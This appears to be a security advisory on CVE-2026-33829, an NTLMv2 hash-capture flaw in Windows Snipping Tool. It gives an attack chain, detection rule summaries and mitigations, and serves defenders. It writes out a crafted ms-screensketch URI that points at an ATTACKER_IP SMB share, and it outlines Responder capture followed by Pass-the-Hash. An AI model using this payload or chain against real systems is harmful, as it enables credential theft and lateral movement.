---
title: Windows Snipping Tool NTLMv2 Hash Hijack Vulnerability (CVE-2026-33829)
slug: 2026-05-snipping-tool-ntlm-hijack
description: A local exploit has been published for Windows Snipping Tool (CVE-2026-33829), enabling NTLMv2 Hash Hijacking by forcing authentication to a remote SMB server via a crafted ms-screensketch:edit URI, potentially leading to credential theft and lateral movement.
date: "2026-05-15T14:50:44Z"
type: advisory
types:
  - advisory
severities:
  - medium
cpes:
  - cpe:2.3:o:microsoft:windows_10_1607:*:*:*:*:*:*:x64:*
  - cpe:2.3:o:microsoft:windows_10_1607:*:*:*:*:*:*:x86:*
  - cpe:2.3:o:microsoft:windows_10_1809:*:*:*:*:*:*:x64:*
  - cpe:2.3:o:microsoft:windows_10_1809:*:*:*:*:*:*:x86:*
  - cpe:2.3:o:microsoft:windows_10_21h2:*:*:*:*:*:*:arm64:*
  - cpe:2.3:o:microsoft:windows_10_21h2:*:*:*:*:*:*:x64:*
  - cpe:2.3:o:microsoft:windows_10_21h2:*:*:*:*:*:*:x86:*
  - cpe:2.3:o:microsoft:windows_10_22h2:*:*:*:*:*:*:arm64:*
  - cpe:2.3:o:microsoft:windows_10_22h2:*:*:*:*:*:*:x64:*
  - cpe:2.3:o:microsoft:windows_10_22h2:*:*:*:*:*:*:x86:*
  - cpe:2.3:o:microsoft:windows_11_23h2:*:*:*:*:*:*:arm64:*
  - cpe:2.3:o:microsoft:windows_11_23h2:*:*:*:*:*:*:x64:*
  - cpe:2.3:o:microsoft:windows_11_24h2:*:*:*:*:*:*:arm64:*
  - cpe:2.3:o:microsoft:windows_11_24h2:*:*:*:*:*:*:x64:*
  - cpe:2.3:o:microsoft:windows_11_25h2:*:*:*:*:*:*:arm64:*
  - cpe:2.3:o:microsoft:windows_11_25h2:*:*:*:*:*:*:x64:*
  - cpe:2.3:o:microsoft:windows_11_26h1:*:*:*:*:*:*:arm64:*
  - cpe:2.3:o:microsoft:windows_11_26h1:*:*:*:*:*:*:x64:*
  - cpe:2.3:o:microsoft:windows_server_2012:-:*:*:*:*:*:*:*
  - cpe:2.3:o:microsoft:windows_server_2012:r2:*:*:*:*:*:*:*
tags:
  - credential-access
  - ntlmv2
  - pass-the-hash
  - cve-2026-33829
vendors:
  - Microsoft
products:
  - Windows Snipping Tool
affected_os:
  - Windows 10
  - Windows 11
  - Windows Server 2012
  - Windows Server 2016
  - Windows Server 2019
  - Windows Server 2022
  - Windows Server 2025
mitre_ttps:
  - tactic_id: TA0006
    tactic_name: Credential Access
    technique_id: T1555
    technique_name: Credentials from Password Stores
cves:
  - id: CVE-2026-33829
    cvss: 4.3
    epss: 0.00033
references:
  - https://exploit-db.com/exploits/52567
  - https://cybersecuritynews.com/windows-snipping-tool-vulnerability/
  - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-33829
  - https://github.com/blackarrowsec/redteam-research/tree/master/CVE-2026-33829
rules:
  - title: Detect Snipping Tool NTLMv2 Hash Hijack Attempt via URI
    description: Detects CVE-2026-33829 exploitation — attempts to exploit the Windows Snipping Tool NTLMv2 Hash Hijack vulnerability by detecting the ms-screensketch URI with a UNC path.
    platform: sigma
    severity: medium
    tactics:
      - credential_access
    techniques:
      - T1187
      - T1555.003
    data_sources:
      - process_creation
      - windows
  - title: Detect Suspicious Process Creation from SnippingTool.exe
    description: Detects suspicious child processes spawned by SnippingTool.exe, which could indicate exploitation or malicious activity.
    platform: sigma
    severity: low
    tactics:
      - credential_access
    techniques:
      - T1059.001
      - T1555.003
    data_sources:
      - process_creation
      - windows
rules_count: 2
---

A public exploit (EDB-52567) has been published detailing an NTLMv2 Hash Hijack vulnerability (CVE-2026-33829) within the Windows Snipping Tool. This vulnerability allows an attacker to force a victim system to authenticate to a remote SMB server under the attacker's control. The exploit leverages a specially crafted `ms-screensketch:edit` URI. When a user clicks a malicious link and approves the "Open Snipping Tool" prompt, their NTLMv2 hash is sent to the attacker's server. This exploit extends beyond the original vector by also attempting to harvest HTTP NTLM hashes via WPAD, LLMNR, and MDNS poisoning, potentially capturing multiple valid hashes from a single user interaction. The affected systems include Windows 10, Windows 11, and Windows Server versions 2012 through 2025 (prior to the April 14, 2026 patch).

## Attack Chain

1.  Attacker sets up a malicious SMB server and Responder on Kali Linux.
2.  Attacker crafts a malicious HTML page containing an `ms-screensketch:edit` URI pointing to the attacker's SMB server: `ms-screensketch:edit?filePath=\\<ATTACKER_IP>\test\evil.png`.
3.  The attacker hosts the malicious HTML page on an HTTP server.
4.  The victim browses to the malicious page and clicks a link or button that triggers the `ms-screensketch:edit` URI.
5.  The victim's system prompts them to "Open Snipping Tool".
6.  If the user approves the prompt, Windows attempts to authenticate to the attacker's SMB server using NTLMv2.
7.  Responder captures the NTLMv2 hash from the authentication attempt.
8.  The attacker uses the captured NTLMv2 hash in a Pass-the-Hash attack using tools like `impacket-psexec` to gain unauthorized access to other systems on the network.

## Impact

Successful exploitation of CVE-2026-33829 allows an attacker to capture a user's NTLMv2 hash. This hash can then be used in Pass-the-Hash attacks, enabling lateral movement and potentially leading to domain compromise. While the CVSS score is rated as Medium (4.3), the impact in practice can be High, as credential theft can lead to significant data breaches and system compromise. The number of potential victims is broad, encompassing any unpatched Windows 10, 11, or Server system.

## Recommendation

*   Apply the Microsoft patch released on April 14, 2026, to remediate CVE-2026-33829.
*   Implement the Sigma rule "Detect Snipping Tool NTLMv2 Hash Hijack Attempt via URI" to detect attempts to exploit this vulnerability.
*   Block outbound SMB traffic (port 445) to prevent successful NTLMv2 hash capture.
*   Disable NTLMv1 and restrict NTLMv2 via Group Policy to mitigate the risk of Pass-the-Hash attacks after successful exploitation.
*   Educate users about the risks of clicking "Open Snipping Tool" prompts from untrusted sources.
